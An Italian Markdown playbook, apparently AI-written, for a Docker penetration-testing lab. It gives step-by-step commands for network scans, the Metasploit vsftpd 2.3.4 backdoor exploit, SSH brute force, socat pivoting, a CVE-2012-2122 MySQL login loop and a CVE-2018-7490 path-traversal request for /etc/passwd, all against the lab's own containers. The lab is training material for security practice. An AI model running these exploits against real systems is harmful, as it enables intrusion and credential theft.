Ecco la guida in formato Markdown, pronta da copiare e incollare su GitHub.

---

# PLAYBOOK - Laboratorio di Cybersecurity con Docker

## Introduzione
Questa guida fornisce istruzioni dettagliate per eseguire una serie di attacchi informatici in un ambiente di laboratorio Docker configurato ad hoc. Ogni sezione copre un attacco specifico, utilizzando container predisposti e strumenti come Metasploit e Nmap. Il laboratorio è progettato per simulare scenari realistici di attacco e fornire esperienza pratica.

### Struttura del Laboratorio
Il laboratorio è composto da diversi container che simulano servizi vulnerabili e configurazioni di rete realistiche. L'ambiente è suddiviso in:
- **Rete Pubblica (172.16.10.0/24)**: Container esposti verso l'esterno.
- **Rete Privata (10.1.0.0/24)**: Container isolati e raggiungibili solo tramite pivoting.

---

## Accesso a Metasploit
Metasploit è uno dei framework più utilizzati per il penetration testing e l’analisi delle vulnerabilità. In questo laboratorio, viene utilizzato sia per la scansione della rete che per l'esecuzione di exploit specifici. La particolarità di questo ambiente è che Metasploit è già installato sui container `attacker` e `attacker-private`, consentendo di lanciare direttamente comandi come `nmap`.

### Avvio di Metasploit:
1. Accedi al container `attacker` o `attacker-private`:
   ```bash
   docker exec -it attacker /bin/bash
   ```
2. Avvia Metasploit:
   ```bash
   ./msfconsole -r docker/msfconsole.rc -y config/database.yml
   ```
3. Metasploit è ora pronto all’uso per eseguire scansioni, exploit e altre attività.

---

## 1. Scansione della rete pubblica dal container `attacker`

### Descrizione:
L’obiettivo di questa attività è effettuare una scansione della rete pubblica per identificare i servizi esposti dai container collegati. La rete pubblica è configurata con il subnet `172.16.10.0/24`. La scansione permette di rilevare IP attivi, porte aperte e servizi in ascolto, informazioni fondamentali per pianificare ulteriori attacchi.

**Passaggi:**
1. Avvia Metasploit:
   ```bash
   ./msfconsole -r docker/msfconsole.rc -y config/database.yml
   ```
2. Utilizza `nmap` direttamente da Metasploit:
   ```bash
   nmap -sV 172.16.10.0/24
   ```
   - L'opzione `-sV` consente di identificare le versioni dei servizi in ascolto.
3. Analizza i risultati per verificare la presenza di container come FTP, MySQL e SSH Honeypot.

---

## 2. Scansione della rete privata dal container `attacker-private`

### Descrizione:
Poiché la rete privata non è accessibile direttamente dal container `attacker`, utilizziamo il container `attacker-private` per eseguire una scansione. Questo container ha accesso alla rete interna `10.1.0.0/24`, dove si trovano container più protetti, come il server web e il servizio SSH.

**Passaggi:**
1. Accedi al container `attacker-private`:
   ```bash
   docker exec -it attacker-private /bin/bash
   ```
2. Avvia Metasploit:
   ```bash
   ./msfconsole -r docker/msfconsole.rc -y config/database.yml
   ```
3. Lancia la scansione della rete privata:
   ```bash
   nmap -sV 10.1.0.0/24
   ```
4. Verifica la presenza di servizi come il server web (`web.euxcorp.com`) e SSH interno.

---

## 3. Attacco FTP (vsftpd 2.3.4) dal container `attacker`

### Descrizione:
Il container FTP utilizza il servizio `vsftpd` versione 2.3.4, noto per una vulnerabilità di backdoor. Quando un utente si autentica con un nome utente contenente uno smiley `:)`, viene aperta una shell remota sulla porta 6200. Questo exploit è una dimostrazione pratica di come un servizio FTP vulnerabile possa esporre il sistema a esecuzione di comandi da remoto.

**Passaggi:**
1. Avvia Metasploit:
   ```bash
   ./msfconsole -r docker/msfconsole.rc -y config/database.yml
   ```
2. Carica il modulo:
   ```bash
   use exploit/unix/ftp/vsftpd_234_backdoor
   ```
3. Configura i parametri:
   ```bash
   set RHOSTS 172.16.10.30
   set RPORT 21
   run
   ```
4. Se l'exploit ha successo, otterrai una shell interattiva.

---

## 4. Attacco SSH Honeypot sul container `public.euxcorp.com`

### Descrizione:
Il container `public.euxcorp.com` contiene un honeypot SSH configurato per registrare ogni tentativo di accesso. Questo è utile per monitorare attività sospette e raccogliere informazioni sugli attaccanti.

**Passaggi:**
1. Accedi al container:
   ```bash
   docker exec -it public.euxcorp.com /bin/bash
   ```
2. Verifica i log:
   ```bash
   tail -f /cowrie/var/log/cowrie/cowrie.log
   ```
3. Tenta l’accesso con Metasploit:
   ```bash
   use auxiliary/scanner/ssh/ssh_login
   set RHOSTS 172.16.10.40
   set RPORT 2222
   set USERNAME admin
   set PASSWORD admin
   run
   ```
4. Controlla i log per visualizzare i tentativi registrati.

---

## 5. Brute Force SSH sul container `access.euxcorp.com` (utilizzando il container `attacker-private`)

### Descrizione:
Il container `access.euxcorp.com` offre un servizio SSH con credenziali deboli configurate intenzionalmente per dimostrare tecniche di brute force. Dal momento che questo servizio si trova sulla rete privata, l'attacco deve essere eseguito dal container `attacker-private`.

Il brute force SSH è un metodo per ottenere accesso non autorizzato tentando diverse combinazioni di credenziali. Questo attacco è comune contro sistemi mal configurati o con password deboli.

**Passaggi:**
1. Accedi al container `attacker-private`:
   ```bash
   docker exec -it attacker-private /bin/bash
   ```
2. Avvia Metasploit:
   ```bash
   ./msfconsole -r docker/msfconsole.rc -y config/database.yml
   ```
3. Carica il modulo per il brute force SSH:
   ```bash
   use auxiliary/scanner/ssh/ssh_login
   ```
4. Configura i parametri:
   ```bash
   set RHOSTS 10.1.0.13
   set USER_FILE /path/to/usernames.txt
   set PASS_FILE /path/to/passwords.txt
   set STOP_ON_SUCCESS true
   run
   ```
5. Verifica se il brute force ha avuto successo: Metasploit mostrerà la combinazione di credenziali corretta.

---

## 6. Pivoting tramite FTP per accedere al container `web.euxcorp.com`

### Descrizione:
Il pivoting è una tecnica avanzata per attraversare segmenti di rete separati dopo aver compromesso un sistema iniziale. Il container `ftp.euxcorp.com`, connesso sia alla rete pubblica che privata, funge da ponte (pivot) tra i due segmenti. Utilizzando `socat`, possiamo creare un tunnel TCP che reindirizza il traffico dalla rete pubblica verso il container web, che risiede solo sulla rete privata.

Questa tecnica dimostra l'uso di un sistema compromesso per ottenere l'accesso ad altre aree della rete.

**Passaggi:**
1. Accedi al container FTP:
   ```bash
   docker exec -it ftp.euxcorp.com /bin/bash
   ```
2. Installa `socat`:
   ```bash
   apk update && apk add socat
   ```
3. Crea il tunnel TCP per il servizio web:
   ```bash
   socat TCP-LISTEN:8081,reuseaddr,fork TCP:10.1.0.17:8080
   ```
   - `TCP-LISTEN:8081`: Ascolta sulla porta 8081.
   - `TCP:10.1.0.17:8080`: Instrada il traffico verso il servizio web sulla porta 8080.
4. Dal container `attacker`, verifica il funzionamento del tunnel:
   ```bash
   curl http://172.16.10.30:8081
   ```
   - Se il tunnel è attivo, visualizzerai la risposta del servizio web.

---

## 7. Attacco MySQL sul container `mysql.euxcorp.com`

### Descrizione:
Il container MySQL utilizza la versione 5.5.23, vulnerabile a un exploit (CVE-2012-2122) che consente l’accesso non autorizzato quando viene inserita una password errata. Questo bug si verifica a causa di un errore nel controllo delle credenziali, in cui una password non corretta può essere casualmente accettata se una funzione hash restituisce uno zero.

L'attacco consiste nel tentare più volte il login con una password sbagliata fino a quando l'errore si verifica, consentendo l'accesso come utente root.

**Passaggi:**
1. Dal container `attacker`, esegui il comando:
   ```bash
   for i in `seq 1 1000`; do mysql -uroot -pwrong -h 172.16.10.60 -P3306 --skip-ssl; done
   ```
   - `for i in seq 1 1000`: Esegue il comando 1000 volte.
   - `mysql -uroot -pwrong`: Tenta di accedere come root con una password errata.
   - `--skip-ssl`: Evita il controllo SSL.
2. Verifica se uno dei tentativi riesce e accedi alla shell MySQL.

**Motivo:**
La vulnerabilità è causata da una gestione errata dell'autenticazione MySQL, in cui una password sbagliata può occasionalmente risultare accettata.

---

## 8. Directory Traversal sul container `web.euxcorp.com`

### Descrizione:
Il servizio web esposto dal container `web.euxcorp.com` è vulnerabile a una directory traversal (CVE-2018-7490). Questa vulnerabilità consente di accedere a file al di fuori della directory root tramite una richiesta HTTP manipolata. Il problema deriva da un'errata gestione dei caratteri di escape nei percorsi.

**Passaggi:**
1. Dal container `attacker`, utilizza il comando:
   ```bash
   curl -v "http://127.0.0.1:8080/..%2f..%2f..%2f..%2fetc%2fpasswd"
   ```
   - `-v`: Modalità verbosa per visualizzare la risposta completa.
   - `%2f`: Rappresenta lo slash (`/`) nel percorso URL encoded.
2. Se l'attacco ha successo, verrà visualizzato il contenuto del file `/etc/passwd`.

**Motivo:**
L’attacco sfrutta un bug nel parsing dei percorsi che non valida correttamente i caratteri `%2f`, consentendo di uscire dalla root directory e accedere a file sensibili.

---

## Conclusioni
Questa guida fornisce un manuale completo e dettagliato per eseguire attacchi utilizzando Metasploit e Nmap, spiegando i motivi tecnici dietro ogni vulnerabilità sfruttata. Utilizzando comandi nativi e tecniche di pivoting, è possibile simulare scenari di attacco realistici.

Ogni attacco dimostra come errori di configurazione o vulnerabilità software possano portare a compromissioni significative. L’obiettivo di questo laboratorio è offrire un’esperienza pratica per comprendere meglio le tecniche utilizzate dagli attaccanti e sviluppare strategie di difesa più efficaci.

---

Fammi sapere se hai bisogno di ulteriori modifiche o di aggiungere altre sezioni!
